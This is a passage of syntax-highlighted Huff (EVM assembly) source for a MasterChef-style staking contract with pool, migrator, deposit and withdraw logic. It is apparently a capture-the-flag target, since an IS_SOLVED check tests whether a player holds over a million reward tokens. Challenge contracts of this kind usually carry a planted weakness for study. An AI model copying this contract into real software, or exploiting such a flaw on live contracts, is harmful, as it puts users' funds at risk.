</span><span>    dev_jump:
</span><span>        </span><span style=color:#62a35c>DEV</span><span>()
</span><span>    sushi_jump:
</span><span>        </span><span style=color:#62a35c>SUSHI</span><span>()
</span><span>    devaddr_jump:
</span><span>        </span><span style=color:#62a35c>DEVADDR</span><span>()
</span><span>    bonus_end_block_jump:
</span><span>        </span><span style=color:#62a35c>BONUS_END_BLOCK</span><span>()
</span><span>    sushi_per_block_jump:
</span><span>        </span><span style=color:#62a35c>SUSHI_PER_BLOCK</span><span>()
</span><span>    bonus_multiplier_jump:
</span><span>        </span><span style=color:#62a35c>BONUS_MULTIPLIER</span><span>()
</span><span>    migrator_jump:
</span><span>        </span><span style=color:#62a35c>MIGRATOR</span><span>()
</span><span>    pool_info_jump:
</span><span>        </span><span style=color:#62a35c>POOL_INFO</span><span>()
</span><span>    user_info_jump:
</span><span>        </span><span style=color:#62a35c>USER_INFO</span><span>()
</span><span>    total_alloc_point_jump:
</span><span>        </span><span style=color:#62a35c>TOTAL_ALLOC_POINT</span><span>()
</span><span>    start_block_jump:
</span><span>        </span><span style=color:#62a35c>START_BLOCK</span><span>()
</span><span>    player_jump:
</span><span>        </span><span style=color:#62a35c>PLAYER</span><span>()
</span><span>    is_solved_jump:
</span><span>        </span><span style=color:#62a35c>IS_SOLVED</span><span>()
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>IS_SOLVED</span><span>() </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>0</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>0</span><span>) {
</span><span>    </span><span style=color:#0086b3>[SUSHI_SLOT] </span><span style=color:#a71d5d;font-weight:700>sload
</span><span>    </span><span style=color:#0086b3>[PLAYER_SLOT] </span><span style=color:#a71d5d;font-weight:700>sload
</span><span>    </span><span style=color:#62a35c>ERC20_BALANCE_OF</span><span>(</span><span style=color:#0086b3>0x00</span><span>)
</span><span>    </span><span style=color:#0086b3>0xd3c21bcecceda1000000
</span><span>    </span><span style=color:#a71d5d;font-weight:700>gt iszero
</span><span>    </span><span style=color:#0086b3>0x40 </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>    </span><span style=color:#0086b3>0x20 0x40 </span><span style=color:#a71d5d;font-weight:700>return
</span><span>    
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>POOL_LENGTH</span><span>() </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>0</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>0</span><span>) {
</span><span>    </span><span style=color:#0086b3>[POOL_INFO_SLOT] </span><span style=color:#a71d5d;font-weight:700>sload
</span><span>    </span><span style=color:#0086b3>0x00 </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>    </span><span style=color:#0086b3>0x20 0x00 </span><span style=color:#a71d5d;font-weight:700>return
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>ADD</span><span>() </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>0</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>0</span><span>) {
</span><span>    </span><span style=color:#62a35c>ONLY_OWNER</span><span>()
</span><span>    </span><span style=color:#0086b3>0x04 </span><span style=color:#a71d5d;font-weight:700>calldataload
</span><span>    </span><span style=color:#0086b3>0x24 </span><span style=color:#a71d5d;font-weight:700>calldataload
</span><span>    </span><span style=color:#0086b3>0x44 </span><span style=color:#a71d5d;font-weight:700>calldataload
</span><span>    </span><span style=color:#a71d5d;font-weight:700>iszero </span><span>no_update_jump </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>        </span><span style=color:#62a35c>MASS_UPDATE_POOLS</span><span>()
</span><span>    no_update_jump:
</span><span>    </span><span style=color:#0086b3>[START_BLOCK_SLOT] </span><span style=color:#a71d5d;font-weight:700>sload
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 number
</span><span>    </span><span style=color:#a71d5d;font-weight:700>gt iszero
</span><span>    is_not_bigger_jump </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>        </span><span style=color:#a71d5d;font-weight:700>pop number
</span><span>    is_not_bigger_jump:
</span><span>    </span><span style=color:#a71d5d;font-weight:700>swap2 dup1
</span><span>    </span><span style=color:#0086b3>[TOTAL_ALLOC_POINT_SLOT] </span><span style=color:#a71d5d;font-weight:700>sload
</span><span>    </span><span style=color:#62a35c>SAFE_ADD</span><span>()
</span><span>    </span><span style=color:#0086b3>[TOTAL_ALLOC_POINT_SLOT] </span><span style=color:#a71d5d;font-weight:700>sstore
</span><span>    </span><span style=color:#a71d5d;font-weight:700>swap1
</span><span>    </span><span style=color:#0086b3>[POOL_INFO_SLOT] </span><span style=color:#a71d5d;font-weight:700>dup1 sload
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#0086b3>0x01 </span><span style=color:#a71d5d;font-weight:700>add
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup3 sstore
</span><span>    </span><span style=color:#0086b3>0x04 </span><span style=color:#a71d5d;font-weight:700>mul
</span><span>    </span><span style=color:#a71d5d;font-weight:700>swap1 </span><span style=color:#0086b3>0x00 </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>    </span><span style=color:#0086b3>0x20 0x00 </span><span style=color:#a71d5d;font-weight:700>sha3
</span><span>    </span><span style=color:#a71d5d;font-weight:700>add
</span><span>    </span><span style=color:#a71d5d;font-weight:700>swap1 dup2 sstore
</span><span>    </span><span style=color:#0086b3>0x01 </span><span style=color:#a71d5d;font-weight:700>add
</span><span>    </span><span style=color:#a71d5d;font-weight:700>swap1 dup2 sstore
</span><span>    </span><span style=color:#0086b3>0x01 </span><span style=color:#a71d5d;font-weight:700>add sstore
</span><span>    </span><span style=color:#a71d5d;font-weight:700>stop
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>SET</span><span>() </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>0</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>0</span><span>) {
</span><span>    </span><span style=color:#62a35c>ONLY_OWNER</span><span>()
</span><span>    </span><span style=color:#0086b3>0x04 </span><span style=color:#a71d5d;font-weight:700>calldataload
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>CHECK_PID</span><span>()
</span><span>    </span><span style=color:#0086b3>0x24 </span><span style=color:#a71d5d;font-weight:700>calldataload
</span><span>    </span><span style=color:#0086b3>0x44 </span><span style=color:#a71d5d;font-weight:700>calldataload
</span><span>    </span><span style=color:#a71d5d;font-weight:700>iszero
</span><span>    no_update_jump </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>        </span><span style=color:#62a35c>MASS_UPDATE_POOLS</span><span>()
</span><span>    no_update_jump:
</span><span>    </span><span style=color:#a71d5d;font-weight:700>swap1 </span><span style=color:#62a35c>GET_POOL_SLOT</span><span>(</span><span style=color:#0086b3>0x00</span><span>)
</span><span>    </span><span style=color:#0086b3>0x01 </span><span style=color:#a71d5d;font-weight:700>add
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup2 dup2 sload
</span><span>    </span><span style=color:#0086b3>[TOTAL_ALLOC_POINT_SLOT] </span><span style=color:#a71d5d;font-weight:700>sload
</span><span>    </span><span style=color:#62a35c>SAFE_SUB</span><span>() </span><span style=color:#62a35c>SAFE_ADD</span><span>()
</span><span>    </span><span style=color:#0086b3>[TOTAL_ALLOC_POINT_SLOT] </span><span style=color:#a71d5d;font-weight:700>sstore sstore
</span><span>    </span><span style=color:#a71d5d;font-weight:700>stop
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>SET_MIGRATOR</span><span>() </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>0</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>0</span><span>) {
</span><span>    </span><span style=color:#62a35c>ONLY_OWNER</span><span>()
</span><span>    </span><span style=color:#0086b3>0x04 </span><span style=color:#a71d5d;font-weight:700>calldataload
</span><span>    </span><span style=color:#0086b3>[MIGRATOR_SLOT] </span><span style=color:#a71d5d;font-weight:700>sstore
</span><span>    </span><span style=color:#a71d5d;font-weight:700>stop
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>MIGRATE</span><span>() </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>0</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>0</span><span>) {
</span><span>    </span><span style=color:#0086b3>[MIGRATOR_SLOT] </span><span style=color:#a71d5d;font-weight:700>sload dup1
</span><span>    </span><span style=color:#a71d5d;font-weight:700>iszero iszero
</span><span>    is_not_zero_jump </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>        </span><span style=color:#62a35c>__ERROR</span><span>(NoMigrator) </span><span style=color:#0086b3>0x00 </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>        </span><span style=color:#0086b3>0x04 0x00 </span><span style=color:#a71d5d;font-weight:700>revert
</span><span>    is_not_zero_jump: 
</span><span>    </span><span style=color:#0086b3>0x04 </span><span style=color:#a71d5d;font-weight:700>calldataload
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>CHECK_PID</span><span>()
</span><span>    </span><span style=color:#62a35c>GET_POOL_SLOT</span><span>(</span><span style=color:#0086b3>0x00</span><span>)
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 sload                    
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 address
</span><span>    </span><span style=color:#62a35c>ERC20_BALANCE_OF</span><span>(</span><span style=color:#0086b3>0x00</span><span>)
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup2 swap1 dup5
</span><span>    </span><span style=color:#62a35c>SAFE_APPROVE</span><span>(</span><span style=color:#0086b3>0x20</span><span>)
</span><span>    </span><span style=color:#62a35c>__RIGHTPAD</span><span>(</span><span style=color:#0086b3>0xce5494bb</span><span>) </span><span style=color:#0086b3>0x20 </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>    </span><span style=color:#0086b3>0x24 </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>    </span><span style=color:#a71d5d;font-weight:700>swap1 </span><span style=color:#0086b3>0x20 0x24 0x20 0x00 0x20
</span><span>    </span><span style=color:#a71d5d;font-weight:700>swap5 gas call
</span><span>    call_success_jump </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>        </span><span style=color:#62a35c>__ERROR</span><span>(CallFailed) &lt;mem_ptr> </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>        </span><span style=color:#0086b3>0x04</span><span> &lt;mem_ptr> </span><span style=color:#a71d5d;font-weight:700>revert
</span><span>    call_success_jump:                      
</span><span>    </span><span style=color:#a71d5d;font-weight:700>returndatasize
</span><span>    size_is_not_zero_jump </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>        </span><span style=color:#62a35c>__ERROR</span><span>(ReturnDataSizeIsZero) &lt;mem_ptr> </span><span style=color:#a71d5d;font-weight:700>mstore 
</span><span>        </span><span style=color:#0086b3>0x04</span><span> &lt;mem_ptr> </span><span style=color:#a71d5d;font-weight:700>revert
</span><span>    size_is_not_zero_jump:
</span><span>    </span><span style=color:#0086b3>0x20 </span><span style=color:#a71d5d;font-weight:700>mload
</span><span>    </span><span style=color:#a71d5d;font-weight:700>address
</span><span>    </span><span style=color:#62a35c>ERC20_BALANCE_OF</span><span>(</span><span style=color:#0086b3>0x40</span><span>)
</span><span>    </span><span style=color:#0086b3>0x00 </span><span style=color:#a71d5d;font-weight:700>mload
</span><span>    </span><span style=color:#a71d5d;font-weight:700>eq </span><span>balances_equal_jump </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>        </span><span style=color:#62a35c>__ERROR</span><span>(ReturnDataSizeIsZero) </span><span style=color:#0086b3>0x00 </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>        </span><span style=color:#0086b3>0x04 0x00 </span><span style=color:#a71d5d;font-weight:700>revert
</span><span>    balances_equal_jump:
</span><span>    </span><span style=color:#0086b3>0x20 </span><span style=color:#a71d5d;font-weight:700>mload
</span><span>    </span><span style=color:#a71d5d;font-weight:700>swap1 sstore
</span><span>    </span><span style=color:#a71d5d;font-weight:700>stop
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>GET_MULTIPLIER</span><span>() </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>0</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>0</span><span>) {
</span><span>    </span><span style=color:#0086b3>0x04 </span><span style=color:#a71d5d;font-weight:700>calldataload
</span><span>    </span><span style=color:#0086b3>0x24 </span><span style=color:#a71d5d;font-weight:700>calldataload
</span><span>    </span><span style=color:#62a35c>INNER_GET_MULTIPLIER</span><span>()
</span><span>    </span><span style=color:#0086b3>0x00 </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>    </span><span style=color:#0086b3>0x20 0x00 </span><span style=color:#a71d5d;font-weight:700>return
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>PENDING_SUSHI</span><span>() </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>0</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>0</span><span>) {
</span><span>    </span><span style=color:#0086b3>0x04 </span><span style=color:#a71d5d;font-weight:700>calldataload
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>CHECK_PID</span><span>()
</span><span>    </span><span style=color:#62a35c>GET_POOL_SLOT</span><span>(</span><span style=color:#0086b3>0x00</span><span>)
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#0086b3>0x03 </span><span style=color:#a71d5d;font-weight:700>add sload
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup2 sload
</span><span>    </span><span style=color:#a71d5d;font-weight:700>address
</span><span>    </span><span style=color:#62a35c>ERC20_BALANCE_OF</span><span>(</span><span style=color:#0086b3>0x00</span><span>)
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup3 </span><span style=color:#0086b3>0x02 </span><span style=color:#a71d5d;font-weight:700>add sload
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 number gt
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup3 iszero iszero
</span><span>    </span><span style=color:#a71d5d;font-weight:700>and iszero
</span><span>    condition_is_false_jump </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>        </span><span style=color:#a71d5d;font-weight:700>number
</span><span>        </span><span style=color:#62a35c>INNER_GET_MULTIPLIER</span><span>()
</span><span>        </span><span style=color:#0086b3>[SUSHI_PER_BLOCK_SLOT] </span><span style=color:#a71d5d;font-weight:700>sload
</span><span>        </span><span style=color:#62a35c>SAFE_MUL</span><span>()
</span><span>        </span><span style=color:#a71d5d;font-weight:700>dup4 </span><span style=color:#0086b3>0x01 </span><span style=color:#a71d5d;font-weight:700>add sload
</span><span>        </span><span style=color:#62a35c>SAFE_MUL</span><span>()
</span><span>        </span><span style=color:#0086b3>[TOTAL_ALLOC_POINT_SLOT] </span><span style=color:#a71d5d;font-weight:700>sload
</span><span>        </span><span style=color:#a71d5d;font-weight:700>swap1 </span><span style=color:#62a35c>SAFE_DIV</span><span>()
</span><span>        </span><span style=color:#0086b3>[E] </span><span style=color:#62a35c>SAFE_MUL</span><span>() </span><span style=color:#62a35c>SAFE_DIV</span><span>()
</span><span>        </span><span style=color:#62a35c>SAFE_ADD</span><span>()
</span><span>        </span><span style=color:#a71d5d;font-weight:700>swap1 pop
</span><span>        end_jump </span><span style=color:#a71d5d;font-weight:700>jump                                      
</span><span>    condition_is_false_jump:
</span><span>        </span><span style=color:#a71d5d;font-weight:700>pop pop
</span><span>        </span><span style=color:#a71d5d;font-weight:700>swap1 pop
</span><span>    end_jump:
</span><span>    </span><span style=color:#0086b3>[E]
</span><span>    </span><span style=color:#0086b3>0x24 </span><span style=color:#a71d5d;font-weight:700>calldataload
</span><span>    </span><span style=color:#0086b3>0x04 </span><span style=color:#a71d5d;font-weight:700>calldataload
</span><span>    </span><span style=color:#0086b3>[USER_INFO_SLOT]
</span><span>    </span><span style=color:#62a35c>GET_SLOT_FROM_KEYS_2D</span><span>(</span><span style=color:#0086b3>0x00</span><span>)
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 sload
</span><span>    </span><span style=color:#a71d5d;font-weight:700>swap1 </span><span style=color:#0086b3>0x01 </span><span style=color:#a71d5d;font-weight:700>add sload
</span><span>    </span><span style=color:#a71d5d;font-weight:700>swap3
</span><span>    </span><span style=color:#62a35c>SAFE_MUL</span><span>() </span><span style=color:#62a35c>SAFE_DIV</span><span>() </span><span style=color:#62a35c>SAFE_SUB</span><span>()
</span><span>    </span><span style=color:#0086b3>0x00 </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>    </span><span style=color:#0086b3>0x20 0x00 </span><span style=color:#a71d5d;font-weight:700>return
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>MASS_UPDATE_POOLS</span><span>() </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>0</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>0</span><span>) {
</span><span>    </span><span style=color:#0086b3>[POOL_INFO_SLOT] </span><span style=color:#a71d5d;font-weight:700>sload
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 iszero
</span><span>    end_jump </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>    </span><span style=color:#0086b3>0x00
</span><span>    start_jump </span><span style=color:#a71d5d;font-weight:700>jump
</span><span>    continue_jump:
</span><span>        </span><span style=color:#a71d5d;font-weight:700>eq </span><span>end_jump </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>        start_jump:
</span><span>        </span><span style=color:#a71d5d;font-weight:700>dup1
</span><span>        </span><span style=color:#62a35c>INNER_UPDATE_POOL</span><span>()
</span><span>        </span><span style=color:#0086b3>0x01 </span><span style=color:#a71d5d;font-weight:700>add
</span><span>        </span><span style=color:#a71d5d;font-weight:700>dup2 dup2
</span><span>        continue_jump </span><span style=color:#a71d5d;font-weight:700>jump
</span><span>    end_jump:
</span><span>    </span><span style=color:#a71d5d;font-weight:700>stop
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>UPDATE_POOL</span><span>() </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>0</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>0</span><span>) {
</span><span>    </span><span style=color:#0086b3>0x04 </span><span style=color:#a71d5d;font-weight:700>calldataload
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>CHECK_PID</span><span>()
</span><span>    </span><span style=color:#62a35c>INNER_UPDATE_POOL</span><span>()
</span><span>    </span><span style=color:#a71d5d;font-weight:700>stop
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>DEPOSIT</span><span>() </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>0</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>0</span><span>) {
</span><span>    </span><span style=color:#0086b3>0x24 </span><span style=color:#a71d5d;font-weight:700>calldataload  
</span><span>    </span><span style=color:#0086b3>0x04 </span><span style=color:#a71d5d;font-weight:700>calldataload 
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>CHECK_PID</span><span>()  
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 
</span><span>    </span><span style=color:#62a35c>INNER_UPDATE_POOL</span><span>() 
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 
</span><span>    </span><span style=color:#62a35c>GET_POOL_SLOT</span><span>(</span><span style=color:#0086b3>0x00</span><span>)  
</span><span>    </span><span style=color:#a71d5d;font-weight:700>caller dup3 
</span><span>    </span><span style=color:#0086b3>[USER_INFO_SLOT] 
</span><span>    </span><span style=color:#62a35c>GET_SLOT_FROM_KEYS_2D</span><span>(</span><span style=color:#0086b3>0x20</span><span>) 
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 sload 
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 iszero 
</span><span>    user_amount_zero_jump </span><span style=color:#a71d5d;font-weight:700>jumpi 
</span><span>        </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#0086b3>[E] 
</span><span>        </span><span style=color:#a71d5d;font-weight:700>dup5 </span><span style=color:#0086b3>0x03 </span><span style=color:#a71d5d;font-weight:700>add sload 
</span><span>        </span><span style=color:#a71d5d;font-weight:700>dup5 </span><span style=color:#0086b3>0x01 </span><span style=color:#a71d5d;font-weight:700>add 
</span><span>        </span><span style=color:#a71d5d;font-weight:700>sload 
</span><span>        </span><span style=color:#a71d5d;font-weight:700>swap3 
</span><span>        </span><span style=color:#62a35c>SAFE_MUL</span><span>() 
</span><span>        </span><span style=color:#62a35c>SAFE_DIV</span><span>() 
</span><span>        </span><span style=color:#62a35c>SAFE_SUB</span><span>() 
</span><span>        </span><span style=color:#a71d5d;font-weight:700>caller 
</span><span>        </span><span style=color:#62a35c>SAFE_SUSHI_TRANSFER</span><span>(</span><span style=color:#0086b3>0x00</span><span>)  
</span><span>    user_amount_zero_jump:   
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup3 sload 
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup6 address caller 
</span><span>    </span><span style=color:#62a35c>SAFE_TRANSFER_FROM</span><span>(</span><span style=color:#0086b3>0x00</span><span>)
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 dup6 </span><span style=color:#62a35c>SAFE_ADD</span><span>()
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup3 sstore
</span><span>    </span><span style=color:#0086b3>[E] </span><span style=color:#a71d5d;font-weight:700>swap1
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup4 </span><span style=color:#0086b3>0x03 </span><span style=color:#a71d5d;font-weight:700>add sload
</span><span>    </span><span style=color:#62a35c>SAFE_MUL</span><span>() </span><span style=color:#62a35c>SAFE_DIV</span><span>()
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup2 </span><span style=color:#0086b3>0x01 </span><span style=color:#a71d5d;font-weight:700>add sstore
</span><span>    </span><span style=color:#a71d5d;font-weight:700>pop pop swap1
</span><span>    </span><span style=color:#0086b3>0x00 </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>    </span><span style=color:#a71d5d;font-weight:700>caller
</span><span>    </span><span style=color:#62a35c>__EVENT_HASH</span><span>(Deposit)
</span><span>    </span><span style=color:#0086b3>0x20 0x00 </span><span style=color:#a71d5d;font-weight:700>log3
</span><span>    </span><span style=color:#a71d5d;font-weight:700>stop
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>WITHDRAW</span><span>() </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>0</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>0</span><span>) {
</span><span>    </span><span style=color:#0086b3>0x24 </span><span style=color:#a71d5d;font-weight:700>calldataload
</span><span>    </span><span style=color:#0086b3>0x04 </span><span style=color:#a71d5d;font-weight:700>calldataload 
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 </span><span style=color:#62a35c>CHECK_PID</span><span>()
</span><span>    </span><span style=color:#a71d5d;font-weight:700>caller dup2 </span><span style=color:#0086b3>[USER_INFO_SLOT]
</span><span>    </span><span style=color:#62a35c>GET_SLOT_FROM_KEYS_2D</span><span>(</span><span style=color:#0086b3>0x00</span><span>)
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 sload
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 dup5 gt iszero
</span><span>    continue_jump </span><span style=color:#a71d5d;font-weight:700>jumpi
</span><span>        </span><span style=color:#62a35c>__ERROR</span><span>(WithdrawNotGood) </span><span style=color:#0086b3>0x00 </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>        </span><span style=color:#0086b3>0x04 0x00 </span><span style=color:#a71d5d;font-weight:700>revert
</span><span>    continue_jump:
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup3
</span><span>    </span><span style=color:#62a35c>INNER_UPDATE_POOL</span><span>()
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup3 </span><span style=color:#62a35c>GET_POOL_SLOT</span><span>(</span><span style=color:#0086b3>0x00</span><span>)
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup2 dup4 </span><span style=color:#0086b3>0x01 </span><span style=color:#a71d5d;font-weight:700>add sload
</span><span>    </span><span style=color:#0086b3>[E] </span><span style=color:#a71d5d;font-weight:700>dup4 </span><span style=color:#0086b3>0x03 </span><span style=color:#a71d5d;font-weight:700>add sload
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 swap4
</span><span>    </span><span style=color:#62a35c>SAFE_MUL</span><span>() </span><span style=color:#62a35c>SAFE_DIV</span><span>() </span><span style=color:#62a35c>SAFE_SUB</span><span>()
</span><span>    </span><span style=color:#a71d5d;font-weight:700>caller
</span><span>    </span><span style=color:#62a35c>SAFE_SUSHI_TRANSFER</span><span>(</span><span style=color:#0086b3>0x00</span><span>)
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup6 dup4 sub dup5 sstore
</span><span>    </span><span style=color:#0086b3>[E] </span><span style=color:#a71d5d;font-weight:700>swap1 dup4
</span><span>    </span><span style=color:#62a35c>SAFE_MUL</span><span>() </span><span style=color:#62a35c>SAFE_DIV</span><span>()
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup4 </span><span style=color:#0086b3>0x01 </span><span style=color:#a71d5d;font-weight:700>add sstore
</span><span>    </span><span style=color:#a71d5d;font-weight:700>sload dup5 caller
</span><span>    </span><span style=color:#62a35c>SAFE_TRANSFER</span><span>(</span><span style=color:#0086b3>0x00</span><span>)
</span><span>    </span><span style=color:#a71d5d;font-weight:700>swap3 </span><span style=color:#0086b3>0x00 </span><span style=color:#a71d5d;font-weight:700>mstore
</span><span>    </span><span style=color:#a71d5d;font-weight:700>pop caller
</span><span>    </span><span style=color:#62a35c>__EVENT_HASH</span><span>(Withdraw)
</span><span>    </span><span style=color:#0086b3>0x20 0x00 </span><span style=color:#a71d5d;font-weight:700>log3
</span><span>    </span><span style=color:#a71d5d;font-weight:700>stop
</span><span>}
</span><span>
</span><span style=color:#a71d5d;font-weight:700>#define macro </span><span style=color:#795da3;font-weight:700>EMERGENCY_WITHDRAW</span><span>() </span><span style=color:#a71d5d;font-weight:700>= </span><span style=color:#62a35c>takes</span><span>(</span><span style=color:#0086b3>0</span><span>) </span><span style=color:#62a35c>returns</span><span>(</span><span style=color:#0086b3>0</span><span>) {
</span><span>    </span><span style=color:#0086b3>0x04 </span><span style=color:#a71d5d;font-weight:700>calldataload  
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 
</span><span>    </span><span style=color:#62a35c>CHECK_PID</span><span>() 
</span><span>    </span><span style=color:#a71d5d;font-weight:700>caller dup2 </span><span style=color:#0086b3>[USER_INFO_SLOT] 
</span><span>    </span><span style=color:#62a35c>GET_SLOT_FROM_KEYS_2D</span><span>(</span><span style=color:#0086b3>0x00</span><span>) 
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup1 sload 
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup2 </span><span style=color:#0086b3>0x01 </span><span style=color:#a71d5d;font-weight:700>add sload
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup4 
</span><span>    </span><span style=color:#62a35c>GET_POOL_SLOT</span><span>(</span><span style=color:#0086b3>0x00</span><span>) 
</span><span>    </span><span style=color:#a71d5d;font-weight:700>sload  
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup3 caller 
</span><span>    </span><span style=color:#62a35c>SAFE_TRANSFER</span><span>(</span><span style=color:#0086b3>0x00</span><span>) 
</span><span>    </span><span style=color:#a71d5d;font-weight:700>dup2 </span><span style=color:#0086b3>0x00 </span><span style=color:#a71d5d;font-weight:700>mstore 
</span><span>    </span><span style=color:#a71d5d;font-weight:700>swap3 caller 
</span><span>    </span><span style=color:#62a35c>__EVENT_HASH</span><span>(EmergencyWithdraw) 
</span><span>    </span><span style=color:#0086b3>0x20 0x00 </span><span style=color:#a71d5d;font-weight:700>log3 
